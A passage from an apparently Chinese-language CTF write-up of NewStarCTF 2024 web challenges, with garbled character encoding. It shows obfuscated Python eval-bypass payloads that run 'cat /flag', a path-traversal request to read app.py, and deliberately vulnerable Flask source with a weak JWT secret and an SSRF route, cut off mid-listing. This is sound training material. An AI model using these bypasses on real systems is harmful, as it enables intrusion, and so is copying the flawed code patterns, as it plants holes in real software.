<p>å€¼å¾—ä¸€æçš„æ˜¯ï¼Œè¿™é‡Œçš„evalåªä¼šå¯¹ä¼ å…¥çš„å­—ç¬¦ä¸²åšâ€œè¡¨è¾¾å¼æ±‚å€¼â€ï¼Œå®ƒå¹¶ä¸ä¼šè‡ªåŠ¨æŠŠä½ å†™åœ¨å­—ç¬¦ä¸²é‡Œçš„ <code>system</code> è§£ææˆ <code>os.system</code>â€”â€”é™¤éä½ è‡ªå·±å…ˆç”¨ <code>import os</code> æŠŠå®ƒå¼•å…¥åˆ°å…¨å±€å‘½åç©ºé—´ï¼Œç„¶åå†è°ƒç”¨ã€‚</p>
<p>æ‰€ä»¥æˆ‘ä»¬è¦æ„é€ çš„æ˜¯<code>__import__('os').system('cat /flag')</code></p>
<p>å¤§è‡´è¿‡ç¨‹å¦‚ä¸‹</p>
<p><img src="/p/newstarctf2024/image-20250705111045755.png"
	width="1013"
	height="717"
	srcset="/p/newstarctf2024/image-20250705111045755_hu4960908464053032697.png 480w, /p/newstarctf2024/image-20250705111045755_hu7684477792463181245.png 1024w"
	loading="lazy"
	
		alt="image-20250705111045755"
	
	
		class="gallery-image" 
		data-flex-grow="141"
		data-flex-basis="339px"
	
></p>
<p>æœ€ç»ˆç»“æœ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">\137\137\151\155\160\157\162\164\137\137(\47\157\163\47).\163\171\163\164\145\155(\47\143\141\164\040\057\146\154\141\147\47)
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/newstarctf2024/image-20250705111135879.png"
	width="1329"
	height="496"
	srcset="/p/newstarctf2024/image-20250705111135879_hu4431005828081733316.png 480w, /p/newstarctf2024/image-20250705111135879_hu12788673410380166574.png 1024w"
	loading="lazy"
	
		alt="image-20250705111135879"
	
	
		class="gallery-image" 
		data-flex-grow="267"
		data-flex-basis="643px"
	
></p>
<p>å¦å¤–å¯ä»¥ç”¨å…¨è§’å­—æ¯+chrç»•è¿‡</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">_ï¼¿ï½‰ï½ï½ï½ï½’ï½”_ï¼¿(ï½ƒï½ˆï½’(111)+ï½ƒï½ˆï½’(115)).ï½“ï½™ï½“ï½”ï½…ï½(ï½ƒï½ˆï½’(99)+ï½ƒï½ˆï½’(97)+ï½ƒï½ˆï½’(116)+ï½ƒï½ˆï½’(32)+ï½ƒï½ˆï½’(47)+ï½ƒï½ˆï½’(102)+ï½ƒï½ˆï½’(108)+ï½ƒï½ˆï½’(97)+ï½ƒï½ˆï½’(103))
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="è¿™ç…§ç‰‡æ˜¯ä½ å—">è¿™ã€Œç…§ç‰‡ã€æ˜¯ä½ å—
</h3><h4 id="çŸ¥è¯†ç‚¹pythonä»£ç å®¡è®¡jwtä¼ªé€ ssrf">çŸ¥è¯†ç‚¹ï¼šPythonä»£ç å®¡è®¡ã€JWTä¼ªé€ ã€SSRF
</h4><p>è¿›æºç çœ‹åˆ°æç¤º</p>
<p><img src="/p/newstarctf2024/image-20250705153914077.png"
	width="1010"
	height="737"
	srcset="/p/newstarctf2024/image-20250705153914077_hu4546496793484834732.png 480w, /p/newstarctf2024/image-20250705153914077_hu13563762360119172327.png 1024w"
	loading="lazy"
	
		alt="image-20250705153914077"
	
	
		class="gallery-image" 
		data-flex-grow="137"
		data-flex-basis="328px"
	
></p>
<p>æ³¨æ„åˆ°å›¾ç‰‡é“¾æ¥æ˜¯é€šè¿‡è·¯ç”±å®ç°çš„ï¼Œæ‰€ä»¥è¿™é‡Œåº”è¯¥æœ‰ä¸€ä¸ªæ–‡ä»¶è¯»å–</p>
<p>è¿™é‡Œæƒ³è¯»æºç çš„è¯éœ€è¦ä¼ <code>/../app.py</code>ï¼Œæ˜¯éœ€è¦æŠ“åŒ…ä¸Šä¼ çš„ï¼Œå› ä¸ºåœ¨æµè§ˆå™¨ä¼ <code>/../app.py</code>çš„è¯ä¼šè§£ææˆ<code>/app.py</code></p>
<p><img src="/p/newstarctf2024/image-20250705155121720.png"
	width="1953"
	height="823"
	srcset="/p/newstarctf2024/image-20250705155121720_hu14131362715453616806.png 480w, /p/newstarctf2024/image-20250705155121720_hu15372725298640148696.png 1024w"
	loading="lazy"
	
		alt="image-20250705155121720"
	
	
		class="gallery-image" 
		data-flex-grow="237"
		data-flex-basis="569px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">flask</span> <span class="n">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">make_response</span><span class="p">,</span> <span class="n">render_template_string</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">redirect</span><span class="p">,</span> <span class="n">send_file</span>
</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">uuid</span>
</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">jwt</span>
</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">time</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">os</span>
</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">requests</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">from</span> <span class="n">flag</span> <span class="n">import</span> <span class="n">get_random_number_string</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">base_key</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">())</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;-&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">secret_key</span> <span class="o">=</span> <span class="n">get_random_number_string</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">admin_pass</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span> <span class="n">_</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="n">base_key</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">admin_pass</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">failure_count</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">users</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;admin&#39;</span><span class="p">:</span> <span class="n">admin_pass</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;amiya&#39;</span><span class="p">:</span> <span class="s2">&#34;114514&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">verify_token</span><span class="p">(</span><span class="n">token</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">global</span> <span class="n">failure_count</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">failure_count</span> <span class="o">&gt;=</span> <span class="mi">100</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">make_response</span><span class="p">(</span><span class="s2">&#34;You have tried too many times! Please restart the service!&#34;</span><span class="p">,</span> <span class="mi">403</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">secret_key</span><span class="p">,</span> <span class="n">algorithms</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;HS256&#34;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;user&#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="s1">&#39;admin&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">failure_count</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">make_response</span><span class="p">(</span><span class="s2">&#34;You are not admin!&lt;br&gt;&lt;img src=&#39;/3.png&#39;&gt;&#34;</span><span class="p">,</span> <span class="mi">403</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">make_response</span><span class="p">(</span><span class="s2">&#34;Token is invalid!&lt;br&gt;&lt;img src=&#39;/3.png&#39;&gt;&#34;</span><span class="p">,</span> <span class="mi">401</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">True</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">@</span><span class="n">app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s2">&#34;/home&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">@</span><span class="n">app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/login&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">global</span> <span class="n">failure_count</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">failure_count</span> <span class="o">&gt;=</span> <span class="mi">100</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">make_response</span><span class="p">(</span><span class="s2">&#34;You have tried too many times! Please restart the service!&#34;</span><span class="p">,</span> <span class="mi">403</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">users</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">username</span><span class="p">)</span><span class="o">==</span><span class="n">password</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">token</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">encode</span><span class="p">({</span><span class="s1">&#39;user&#39;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span> <span class="s1">&#39;exp&#39;</span><span class="p">:</span> <span class="ne">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span> <span class="o">+</span> <span class="mi">600</span><span class="p">},</span> <span class="n">secret_key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="n">make_response</span><span class="p">(</span><span class="s1">&#39;Login success!&lt;br&gt;&lt;a href=&#34;/home&#34;&gt;Go to homepage&lt;/a&gt;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">response</span><span class="o">.</span><span class="n">set_cookie</span><span class="p">(</span><span class="s1">&#39;token&#39;</span><span class="p">,</span> <span class="n">token</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">response</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">failure_count</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">make_response</span><span class="p">(</span><span class="s1">&#39;Could not verify!&lt;br&gt;&lt;img src=&#34;/3.png&#34;&gt;&#39;</span><span class="p">,</span> <span class="mi">401</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">@</span><span class="n">app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/logout&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">logout</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">response</span> <span class="o">=</span> <span class="n">make_response</span><span class="p">(</span><span class="s1">&#39;Logout success!&lt;br&gt;&lt;a href=&#34;/home&#34;&gt;Go to homepage&lt;/a&gt;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">response</span><span class="o">.</span><span class="n">set_cookie</span><span class="p">(</span><span class="s1">&#39;token&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">expires</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">response</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">@</span><span class="n">app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/home&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">home</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">logged_in</span> <span class="o">=</span> <span class="n">False</span>
</span></span><span class="line"><span class="cl">    <span class="n">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">token</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;token&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">secret_key</span><span class="p">,</span> <span class="n">algorithms</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;HS256&#34;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        <span class="n">text</span> <span class="o">=</span> <span class="s2">&#34;Hello, </span><span class="si">%s</span><span class="s2">!&#34;</span> <span class="o">%</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;user&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">logged_in</span> <span class="o">=</span> <span class="n">True</span>
</span></span><span class="line"><span class="cl">    <span class="n">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">logged_in</span> <span class="o">=</span> <span class="n">False</span>
</span></span><span class="line"><span class="cl">        <span class="n">text</span> <span class="o">=</span> <span class="s2">&#34;You have not logged in!&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;!DOCTYPE html&gt;
</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;html&gt;
</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;head&gt;
</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;title&gt;Home Page&lt;/title&gt;
</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;/head&gt;
</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;body&gt;
</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;!-- å›¾æ ‡èƒ½å¤Ÿæ­£å¸¸æ˜¾ç¤ºè€¶! --&gt;
</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;!-- ä½†æ˜¯æˆ‘å¥½åƒæ²¡æœ‰çœ‹åˆ°Nginxæˆ–è€…Apacheä¹‹ç±»çš„ä¸œè¥¿ --&gt;
</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;!-- è¯´æ˜æœåŠ¡å™¨è„šæœ¬èƒ½å¤Ÿå¤„ç†é™æ€æ–‡ä»¶æ --&gt;
</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;!-- é‚£æºç æ˜¯ä¸æ˜¯å¯ä»¥ç”¨æŸäº›åŠæ³•æ‹¿åˆ°å‘¢! --&gt;
</span></span></span><span class="line"><span class="cl"><span class="s1">            {{ text }}&lt;br&gt;
</span></span></span><span class="line"><span class="cl"><span class="s1">            {</span><span class="si">% i</span><span class="s1">f logged_in %}
</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;a href=&#34;/logout&#34;&gt;ç™»å‡º&lt;/a&gt;
</span></span></span><span class="line"><span class="cl"><span class="s1">            {</span><span class="si">% e</span><span class="s1">lse %}
</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;h2&gt;ç™»å½•&lt;/h2&gt;
</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;form action=&#34;/login&#34; method=&#34;post&#34;&gt;
</span></span></span><span class="line"><span class="cl"><span class="s1">                ç”¨æˆ·å: &lt;input type=&#34;text&#34; name=&#34;username&#34;&gt;&lt;br&gt;
</span></span></span><span class="line"><span class="cl"><span class="s1">                å¯†ç : &lt;input type=&#34;password&#34; name=&#34;password&#34;&gt;&lt;br&gt;
</span></span></span><span class="line"><span class="cl"><span class="s1">                &lt;input type=&#34;submit&#34; value=&#34;ç™»å½•&#34;&gt;
</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;/form&gt;
</span></span></span><span class="line"><span class="cl"><span class="s1">            {</span><span class="si">% e</span><span class="s1">ndif %}
</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;br&gt;
</span></span></span><span class="line"><span class="cl"><span class="s1">            {</span><span class="si">% i</span><span class="s1">f user==&#34;admin&#34; %}
</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;a href=&#34;/admin&#34;&gt;Go to admin panel&lt;/a&gt;
</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;img src=&#34;/2.png&#34;&gt;
</span></span></span><span class="line"><span class="cl"><span class="s1">            {</span><span class="si">% e</span><span class="s1">lse %}
</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;img src=&#34;/1.png&#34;&gt;
</span></span></span><span class="line"><span class="cl"><span class="s1">            {</span><span class="si">% e</span><span class="s1">ndif %}
</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;/body&gt;
</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;/html&gt;
</span></span></span><span class="line"><span class="cl"><span class="s1">    &#39;&#39;&#39;</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="n">text</span><span class="p">,</span> <span class="n">logged_in</span><span class="o">=</span><span class="n">logged_in</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;user&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">@</span><span class="n">app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/admin&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">admin</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">token</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;token&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">verify_token</span><span class="p">(</span><span class="n">token</span><span class="p">)</span> <span class="o">!=</span> <span class="n">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">verify_token</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">resp_text</span> <span class="o">=</span> <span class="n">render_template_string</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;!DOCTYPE html&gt;
</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;html&gt;
</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;head&gt;
</span></span></span><span class="line"><span class="cl"><span class="s1">                &lt;title&gt;Admin Panel&lt;/title&gt;
</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;/head&gt;
</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;body&gt;
</span></span></span><span class="line"><span class="cl"><span class="s1">                &lt;h1&gt;Admin Panel&lt;/h1&gt;
</span></span></span><span class="line"><span class="cl"><span class="s1">                &lt;p&gt;GET Server Info from api:&lt;/p&gt;
</span></span></span><span class="line"><span class="cl"><span class="s1">                &lt;input type=&#34;input&#34; value={{api_url}} id=&#34;api&#34; readonly&gt;
</span></span></span><span class="line"><span class="cl"><span class="s1">                &lt;button onclick=execute()&gt;Execute&lt;/button&gt;
</span></span></span><span class="line"><span class="cl"><span class="s1">                &lt;script&gt;
</span></span></span><span class="line"><span class="cl"><span class="s1">                    function execute() {
</span></span></span><span class="line"><span class="cl"><span class="s1">                        fetch(&#34;{{url}}/execute?api_address=&#34;+document.getElementById(&#34;api&#34;).value,
</span></span></span><span class="line"><span class="cl"><span class="s1">                                      {credentials: &#34;include&#34;}
</span></span></span><span class="line"><span class="cl"><span class="s1">                                      ).then(res =&gt; res.text()).then(data =&gt; {
</span></span></span><span class="line"><span class="cl"><span class="s1">                            document.write(data);
</span></span></span><span class="line"><span class="cl"><span class="s1">                        });
</span></span></span><span class="line"><span class="cl"><span class="s1">                    }
</span></span></span><span class="line"><span class="cl"><span class="s1">                &lt;/script&gt;
</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;/body&gt;
</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;/html&gt;
</span></span></span><span class="line"><span class="cl"><span class="s1">        &#39;&#39;&#39;</span><span class="p">,</span> <span class="n">api_url</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="n">host_url</span><span class="o">+</span><span class="s2">&#34;/api&#34;</span><span class="p">,</span> <span class="n">url</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="n">host_url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">resp</span> <span class="o">=</span> <span class="n">make_response</span><span class="p">(</span><span class="n">resp_text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">resp</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;Access-Control-Allow-Credentials&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;true&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">resp</span>
</span></span><span class="line"><span class="cl">    <span class="n">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">make_response</span><span class="p">(</span><span class="s2">&#34;Token is invalid!&lt;br&gt;&lt;img src=&#39;/3.png&#39;&gt;&#34;</span><span class="p">,</span> <span class="mi">401</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">@</span><span class="n">app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/execute&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">execute</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">token</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;token&#39;</span><span class="p">)</span>
